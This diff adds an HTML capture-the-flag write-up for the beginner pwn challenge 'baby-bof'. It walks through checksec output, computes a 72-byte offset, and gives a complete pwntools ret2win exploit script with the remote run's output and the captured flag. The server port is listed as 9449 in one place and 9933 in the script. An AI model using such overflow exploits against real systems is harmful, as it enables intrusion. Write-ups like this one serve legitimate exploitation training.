@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Writeup - PWN Buffer Overflow</title>
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #e0e0e0;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #1a1a1a;
+        }
+        header {
+            background-color: #121212;
+            color: white;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
+            border-left: 4px solid #0d7377;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 2.2em;
+            color: #0d7377;
+        }
+        .challenge-info {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-top: 15px;
+        }
+        .challenge-info div {
+            background-color: #222;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+        }
+        .container {
+            background-color: #222;
+            padding: 30px;
+            border-radius: 5px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #0d7377;
+            border-bottom: 2px solid #333;
+            padding-bottom: 10px;
+        }
+        h3 {
+            color: #14ffec;
+            margin-top: 25px;
+        }
+        pre {
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 15px 0;
+            padding: 0;
+        }
+        code {
+            font-family: 'Consolas', 'Monaco', monospace;
+            border-radius: 5px;
+        }
+        .description {
+            background-color: #2a2a2a;
+            border-left: 4px solid #0d7377;
+            padding: 10px 20px;
+            margin: 20px 0;
+        }
+        .flag {
+            background-color: #1c3b1c;
+            color: #00ff7f;
+            padding: 10px 20px;
+            border-left: 4px solid #00ff7f;
+            margin: 20px 0;
+            font-weight: bold;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+        .step {
+            margin-bottom: 30px;
+        }
+        .step-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #14ffec;
+        }
+        ul {
+            padding-left: 20px;
+        }
+        ul li {
+            margin-bottom: 8px;
+        }
+        .references a {
+            color: #14ffec;
+            text-decoration: none;
+        }
+        .references a:hover {
+            text-decoration: underline;
+            color: #0d7377;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #777;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #444;
+            border-radius: 4px;
+            padding: 5px;
+            margin: 10px 0;
+        }
+        .command {
+            background-color: #151515;
+            color: #14ffec;
+            padding: 10px 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            border-left: 4px solid #0d7377;
+        }
+        .output {
+            background-color: #1a1a1a;
+            padding: 10px 15px;
+            border-radius: 5px;
+            border-left: 4px solid #444;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            color: #ddd;
+        }
+        .highlight-section {
+            background-color: #1a1a1a;
+            border-left: 4px solid #14ffec;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        a {
+            color: #14ffec;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .emoji {
+            font-size: 1.2em;
+            margin-right: 5px;
+        }
+        .key-point {
+            border-left: 3px solid #ff7e67;
+            padding-left: 15px;
+            margin: 15px 0;
+            background-color: rgba(255, 126, 103, 0.1);
+        }
+        .binary-info {
+            background-color: #2a2a2a;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>🎯 Challenge: baby-bof</h1>
+        <div class="challenge-info">
+            <div>🏆 CTF@AC</div>
+            <div>📢 Category: Pwn</div>
+            <div>💯 Points: 100</div>
+            <div>📊 Solves: 105</div>
+            <div>👤 Author: thek0der</div>
+            <div>👤 Solver: ArghgrA/CuboConNoveQuadrati</div>
+        </div>
+    </header>
+    <div class="container">
+        <h2>📝 Challenge Description & Summary</h2>
+        <div class="description">
+            <p>This is your first pwn challenge.</p>
+        </div>
+        <p><strong>📁 Files:</strong> challenge (binary)</p>
+        <p><strong>🌐 Server:</strong> ctf.ac.upt.ro:9449</p>
+    </div>
+    <div class="container">
+        <h2>🔍 Binary Information</h2>
+        <p>Output obtained with tools like checksec, file, readelf:</p>
+        <div class="binary-info">
+            Architecture: amd64-64-little<br>
+            RELRO: Partial RELRO<br>
+            Stack: No canary found<br>
+            NX: NX enabled<br>
+            PIE: No PIE (base 0x400000)<br>
+            Stripped: No
+        </div>
+        <div class="key-point">
+            <p>⚠️ These characteristics make it possible to overflow the return address to a static address like win().</p>
+        </div>
+    </div>
+    <div class="container">
+        <h2>🛠️ Analysis and Solution</h2>
+        <div class="step">
+            <h3>🔑 Step 1: Vulnerability Identification</h3>
+            <p>Static/dynamic analysis (gdb/objdump/disassembly) revealed:</p>
+            <div class="output">
+                • Vulnerable buffer of 64 bytes<br>
+                • Saved RBP (8 bytes) immediately after the buffer<br>
+                • Address of win() function: 0x401196
+            </div>
+            <p>Therefore, the offset needed to overwrite the return address is:</p>
+            <div class="command">
+                offset = 64 (buffer) + 8 (saved RBP) = 72 bytes
+            </div>
+            <div class="key-point">
+                <p>🔍 The vulnerability lies in a simple buffer overflow that allows us to control the return address and redirect execution flow to the win() function.</p>
+            </div>
+        </div>
+        <div class="step">
+            <h3>🎯 Step 2: Exploit Logic and Payload Construction</h3>
+            <p>Payload schema:</p>
+            <div class="output">
+                b"A" * 64  — fills the vulnerable buffer<br>
+                b"B" * 8   — overwrites saved RBP (placeholder)<br>
+                p64(0x401196) — new return address pointing to win()
+            </div>
+            <p>Final payload (conceptual):</p>
+            <pre><code class="language-python">payload = b"A" * 64 + b"B" * 8 + p64(0x401196)
+# or simply
+payload = b"A" * 72 + p64(0x401196)</code></pre>
+            <div class="highlight-section">
+                <p>💡 <strong>Key Insight:</strong> Since NX is enabled, we don't inject shellcode into the stack; we directly exploit the address of win() (return-to-function technique).</p>
+            </div>
+        </div>
+        <div class="step">
+            <h3>🐍 Step 3: Pwntools Script (Complete and Commented)</h3>
+            <pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+
+# Remote server data
+host = 'ctf.ac.upt.ro'
+port = 9933
+
+# Pwntools settings
+context.binary = ELF('./challenge') # still useful for local analysis
+elf = context.binary
+
+# Address of the win function (assumed to be the same on remote)
+win_addr = 0x401196
+
+# Offset: 64 bytes of buffer + 8 bytes of RBP
+offset = 64 + 8
+
+# Payload: overflow + jump a win()
+payload = b"A" * offset + p64(win_addr)
+
+# Remote connection
+p = remote(host, port)
+
+# Read and print the first line (e.g., "Bine ai venit la PWN!")
+print(p.recvline().decode())
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the remote shell to read the flag
+p.interactive() </code></pre>
+        </div>
+        <div class="step">
+            <h3>🚩 Step 4: Execution and Result</h3>
+            <p>Running the script against the remote server:</p>
+            <div class="output">
+[*] Opening connection to ctf.ac.upt.ro on port 9933: Done
+Bine ai venit la PWN!
+[*] Switching to interactive mode
+Spune ceva: ctf{3c1315f63d550570a690f693554647b7763c3acbc806ae846ce8d25b5f364d10}
+[*] Got EOF while reading in interactive
+            </div>
+            <div class="flag">
+                ctf{3c1315f63d550570a690f693554647b7763c3acbc806ae846ce8d25b5f364d10}
+            </div>
+        </div>
+    </div>
+    <div class="container">
+        <h2>📚 Lessons Learned</h2>
+        <ul>
+            <li>Simple buffer overflows on binaries without modern protections (PIE, canaries) are straightforward to exploit.</li>
+            <li>The return-to-function technique is effective when NX is enabled but PIE is disabled.</li>
+            <li>Proper offset calculation is crucial: buffer size + saved RBP size = total offset to return address.</li>
+            <li>Pwntools provides excellent utilities for binary exploitation with functions like p64() for address packing.</li>
+            <li>Static analysis tools (checksec, objdump, gdb) are essential for understanding binary protections and function addresses.</li>
+        </ul>
+    </div>
+    <div class="container references">
+        <h2>🔗 References</h2>
+        <ul>
+            <li><a href="https://github.com/Gallopsled/pwntools">Pwntools Documentation</a></li>
+            <li><a href="https://github.com/slimm609/checksec.sh">Checksec Tool</a></li>
+            <li><a href="https://sourceware.org/gdb/">GDB Debugger</a></li>
+        </ul>
+    </div>
+    <div class="footer">
+        <p>🏆 © 2025 - Writeup created by ArghgrA/CuboConNoveQuadrati | Happy hacking! 🔍</p>
+    </div>
+</body>
+</html>
